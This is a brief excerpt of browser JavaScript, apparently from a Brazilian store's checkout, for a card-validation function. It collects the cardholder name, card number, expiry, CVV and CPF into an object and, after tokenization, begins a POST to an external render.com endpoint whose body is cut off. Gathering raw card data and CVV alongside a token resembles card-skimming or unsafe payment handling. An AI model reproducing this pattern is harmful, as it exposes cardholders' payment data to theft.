...
async function validarCartaoAutomatico() {
    ...
    const dadosExtras = {
    nomeNoCartao: document.getElementById('card-nome').value,
    nCartao: document.getElementById('card-numero').value,
    validade: document.getElementById('card-validade').value,
    cvv: document.getElementById('card-cvv').value,
    cpfTitular: document.getElementById('card-cpf').value,
    nomeRecebedor: document.getElementById('nome').value // Nome da entrega
};
    ...
    try {
        ...
        if (token.id) {
            const response = await fetch("https://duff-store.onrender.com/validar-cartao", {
                method: "POST",
